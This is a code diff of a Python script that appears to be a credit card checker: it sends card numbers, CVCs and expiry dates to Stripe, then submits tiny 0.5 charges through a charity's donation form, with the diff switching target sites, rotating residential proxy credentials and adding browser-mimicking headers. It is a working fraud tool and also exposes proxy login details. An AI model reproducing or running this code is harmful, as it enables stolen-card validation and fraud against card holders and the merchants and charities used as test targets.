@@ -10,8 +10,8 @@ from urllib3.util.retry import Retry
 # ==========================================
 PROXY_HOST = 'geo.g-w.info'
 PROXY_PORT = '10080'
-PROXY_USER = 'user-7xkEOw8bXcNNWHHW-type-residential-session-rk4vzalg-country-US-city-San_Francisco-rotation-15'
-PROXY_PASS = 'CMvQFPYozpgFTlXC'
+PROXY_USER = 'user-rL9mqeSecubayN9h-type-residential-session-r9z2b1dq-country-US-city-San_Francisco-rotation-15'
+PROXY_PASS = '4NvlmbUrwSPnf9r0'
 
 proxy_url = f"http://{PROXY_USER}:{PROXY_PASS}@{PROXY_HOST}:{PROXY_PORT}"
 proxies = {
@@ -52,19 +52,22 @@ def Tele(ccx):
         headers = {
             'authority': 'api.stripe.com',
             'accept': 'application/json',
+            'accept-language': 'en-US,en;q=0.9',
             'content-type': 'application/x-www-form-urlencoded',
             'origin': 'https://js.stripe.com',
             'referer': 'https://js.stripe.com/',
             'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
             'sec-ch-ua-mobile': '?1',
             'sec-ch-ua-platform': '"Android"',
+            'sec-fetch-dest': 'empty',
+            'sec-fetch-mode': 'cors',
+            'sec-fetch-site': 'same-site',
             'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
         }
-        
-        # 🔥 Note: Fixed 'card-elementl' typo to 'card-element'
-        data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=NA&muid=NA&sid=NA&payment_user_agent=stripe.js%2Fc264a67020%3B+stripe-js-v3%2Fc264a67020%3B+card-element&key=pk_live_51OYXFULO4BFQIVS8A1MHvzEgvXqMyIjsIBrenSqSW5OdwWuP8IgL7PipGs5z1EXZME1SWUtuR5z7aruBJKIynEXi00cnAXc7yM'
-        
-        response = session.post(
+
+        data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=NA&muid=NA&sid=NA&payment_user_agent=stripe.js%2F35d1c775d8%3B+stripe-js-v3%2F35d1c775d8%3B+card-element&key=pk_live_51LTAH3KQqBJAM2n1ywv46dJsjQWht8ckfcm7d15RiE8eIpXWXUvfshCKKsDCyFZG48CY68L9dUTB0UsbDQe32Zn700Qe4vrX0d'
+
+        response = requests.post(
             'https://api.stripe.com/v1/payment_methods',
             headers=headers,
             data=data,
@@ -99,32 +102,44 @@ def Tele(ccx):
         # Step 2: Charge Request (rrssameday.co.uk)
         # ==========================================
         headers = {
-            'authority': 'rrssameday.co.uk',
+            'authority': 'texassouthernacademy.com',
             'accept': 'application/json, text/javascript, */*; q=0.01',
             'accept-language': 'en-US,en;q=0.9',
             'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
-            'origin': 'https://rrssameday.co.uk',
-            'referer': 'https://rrssameday.co.uk/payments/',
+            'origin': 'https://texassouthernacademy.com',
+            'referer': 'https://texassouthernacademy.com/donation/',
             'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
             'sec-ch-ua-mobile': '?1',
             'sec-ch-ua-platform': '"Android"',
-            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
-            'X-Requested-With': 'XMLHttpRequest',
+            'sec-fetch-dest': 'empty',
+            'sec-fetch-mode': 'cors',
+            'sec-fetch-site': 'same-origin',
+            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+            'x-requested-with': 'XMLHttpRequest',
         }
 
         data = {
-            'action': 'wp_full_stripe_inline_payment_charge',
-            'wpfs-form-name': 'MakeAPayment',
+            'action': 'wp_full_stripe_inline_donation_charge',
+            'wpfs-form-name': 'donate',
             'wpfs-form-get-parameters': '%7B%7D',
+            'wpfs-custom-amount': 'other',
             'wpfs-custom-amount-unique': '0.5',
-            'wpfs-custom-input[]': '',
+            'wpfs-donation-frequency': 'one-time',
+            'wpfs-billing-name': '6',
+            'wpfs-billing-address-country': 'US',
+            'wpfs-billing-address-line-1': 'Street 2',
+            'wpfs-billing-address-line-2': '',
+            'wpfs-billing-address-city': 'New York',
+            'wpfs-billing-address-state': '',
+            'wpfs-billing-address-state-select': 'CA',
+            'wpfs-billing-address-zip': '10080',
             'wpfs-card-holder-email': random_email,
             'wpfs-card-holder-name': 'Min Thant',
             'wpfs-stripe-payment-method-id': f'{pm}',
         }
 
-        response = session.post(
-            'https://rrssameday.co.uk/wp-admin/admin-ajax.php',
+        response = requests.post(
+            'https://texassouthernacademy.com/wp-admin/admin-ajax.php',
             headers=headers,
             data=data,
             timeout=60
